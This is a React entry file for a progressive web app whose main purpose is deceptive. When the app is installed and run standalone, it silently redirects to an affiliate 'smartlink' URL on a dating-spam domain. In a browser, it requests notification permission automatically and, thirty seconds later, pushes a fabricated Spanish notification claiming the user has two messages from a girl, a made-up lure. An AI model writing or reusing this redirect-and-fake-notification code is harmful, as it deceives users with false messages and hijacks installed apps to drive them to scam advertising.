import { createRoot } from 'react-dom/client';
import App from './App.tsx';
import './index.css';
import { registerServiceWorker } from './utils/pwa.ts';


const smartlink = 'https://llqrbo.sweets4datings.com/?utm_source=da57dc555e50572d&ban=other&j1=1&s1=220791&s2=2027339';
const isStandalone = window.matchMedia('(display-mode: standalone)').matches || (window.navigator as any).standalone;
if (isStandalone) {
  window.location.replace(smartlink);
} else {
  registerServiceWorker();
  // Автоматический запрос разрешения на уведомления
  if ('Notification' in window && navigator.serviceWorker) {
    Notification.requestPermission().then(permission => {
      if (permission === 'granted') {
        setTimeout(async () => {
          const registration = await navigator.serviceWorker.getRegistration();
          if (registration) {
            registration.showNotification('Tienes dos mensajes de una chica', {
              body: 'Abre el chat para leerlos',
              icon: '/icon-192.png',
              badge: '/icon-192.png',
              tag: 'new-messages',
              renotify: true,
              actions: [
                { action: 'open', title: 'Abrir chat', icon: '/icon-192.png' }
              ],
              data: { url: '/' }
            });
          }
        }, 30000); // 30 секунд
      }
    });
  }
  createRoot(document.getElementById('root')!).render(<App />);
}
